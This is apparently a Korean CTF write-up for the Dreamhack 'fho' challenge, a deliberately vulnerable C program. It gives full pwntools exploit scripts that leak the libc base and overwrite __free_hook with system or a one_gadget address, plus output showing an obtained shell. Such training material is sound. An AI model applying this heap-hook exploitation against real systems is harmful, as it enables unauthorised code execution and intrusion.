[[one_gadget]]

# 문제 코드
```c
// Name: fho.c
// Compile: gcc -o fho fho.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
  char buf[0x30];
  unsigned long long *addr;
  unsigned long long value;

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  puts("[1] Stack buffer overflow");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  puts("[2] Arbitary-Address-Write");
  printf("To write: ");
  scanf("%llu", &addr);
  printf("With: ");
  scanf("%llu", &value);
  printf("[%p] = %llu\n", addr, value);
  *addr = value;

  puts("[3] Arbitrary-Address-Free");
  printf("To free: ");
  scanf("%llu", &addr);
  free(addr);

  return 0;
}
```


# 분석
`Compile: gcc -o fho fho.c`
모든 보호기법이 적용됨
`free` 함수의 훅을 덮는 문제

스택의 어떤 값을 읽을 수 있음
```c
puts("[1] Stack buffer overflow");
printf("Buf: ");
read(0, buf, 0x100);
printf("Buf: %s\n", buf);
```

임의 주소에 임의 값을 쓸 수 있음
```c
puts("[2] Arbitary-Address-Write");
printf("To write: ");
scanf("%llu", &addr);
printf("With: ");
scanf("%llu", &value);
printf("[%p] = %llu\n", addr, value);
*addr = value;
```

임의 주소를 해제할 수 있음
```c
puts("[3] Arbitrary-Address-Free");
printf("To free: ");
scanf("%llu", &addr);
free(addr);
```

`__free_hook` , `system` 함수, `“/bin/sh”` 문자열은 libc 파일에 정의되어 있으므로, 주어진 libc 파일로부터 이들의 오프셋을 얻을 수 있음

메인 함수의 리턴 주소를 읽으면 libc_base를 읽을 수 있음

`__free_hook` 의 값을 `system` 함수의 주소로 덮어쓰고, 에서 `“/bin/sh”` 를 해제(free)하게 하면 `system(“/bin/sh”)` 가 호출되어 셸을 획득할 수 있게됨


# exploit
```python
from pwn import *

p = process('./fho')
e = ELF('./fho')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')


buf = b'A'*0x48

# [1] Leak libc base
p.sendafter('Buf: ', buf)
p.recvuntil(buf)

libc_start_main_xx = u64(p.recvline()[:-1] + b'\x00'*2)
libc_base = libc_start_main_xx - (libc.symbols['__libc_start_main'] + 231)

system = libc_base + libc.symbols['system']
free_hook = libc_base + libc.symbols['__free_hook']
binsh = libc_base + next(libc.search(b'/bin/sh'))

# [2] Overwrite `free_hook` with `system`
p.recvuntil('To write: ')
p.sendline(str(free_hook).encode())
p.recvuntil('With: ')
p.sendline(str(system).encode())

# [3] Exploit
p.recvuntil('To free: ')
p.sendline(str(binsh).encode())

p.interactive()
```

# 결과
```sh
root@980b7f3576b0:/home/fho# python3 exploit.py 
[+] Starting local process './fho': pid 7646
Exception in thread Thread-1:
Traceback (most recent call last):
  File "/usr/lib/python3.6/threading.py", line 916, in _bootstrap_inner
    self.run()
  File "/usr/lib/python3.6/threading.py", line 864, in run
    self._target(*self._args, **self._kwargs)
  File "/usr/local/lib/python3.6/dist-packages/pwnlib/log.py", line 572, in spin
    spinner_handle.update(prefix)
  File "/usr/local/lib/python3.6/dist-packages/pwnlib/term/term.py", line 199, in update
    update(self.h, s)
  File "/usr/local/lib/python3.6/dist-packages/pwnlib/term/term.py", line 548, in update
    render_from(i, clear_after = True)
  File "/usr/local/lib/python3.6/dist-packages/pwnlib/term/term.py", line 466, in render_from
    render_cell(c, clear_after = clear_after)
  File "/usr/local/lib/python3.6/dist-packages/pwnlib/term/term.py", line 369, in render_cell
    put(c)
  File "/usr/local/lib/python3.6/dist-packages/pwnlib/term/term.py", line 176, in put
    fd.write(s)
UnicodeEncodeError: 'ascii' codec can't encode character '\u2190' in position 0: ordinal not in range(128)

[!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 2)
[*] '/home/fho/fho'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 2)
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Switching to interactive mode
$ ls
exploit.py  fho  flag
$  

```

# one_gadget 이용
먼저, one_gadget을 이용하여 가젯을 찾음
```sh
┌──(foo1㉿main-server)-[~/Desktop/Dreamhack/fho]
└─$ one_gadget libc-2.27.so 
0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

원가젯은 바로 쉘을 실행시키므로, 따로 `system`, `/bin/sh`에 대한 준비를 할 필요가 없음
```python
from pwn import *

p = remote("host3.dreamhack.games", 16188)
e = ELF('./fho')
libc = ELF('./libc-2.27.so')


buf = b'A'*0x48

# [1] Leak libc base
p.sendafter('Buf: ', buf)
p.recvuntil(buf)

libc_start_main_xx = u64(p.recvline()[:-1] + b'\x00'*2)
libc_base = libc_start_main_xx - (libc.symbols['__libc_start_main'] + 231)

system = libc_base + libc.symbols['system']
free_hook = libc_base + libc.symbols['__free_hook']
#binsh = libc_base + next(libc.search(b'/bin/sh'))    #/bin/sh 필요 없음
og = libc_base+0x4f432

# [2] Overwrite `free_hook` with `system`
p.recvuntil('To write: ')
p.sendline(str(free_hook).encode())
p.recvuntil('With: ')
#p.sendline(str(system).encode())    #system 필요 없음
p.sendline(str(og).encode())

# [3] Exploit
p.recvuntil('To free: ')
p.sendline(str(0xf001).encode())   #/bin/sh 필요 없음

p.interactive()
```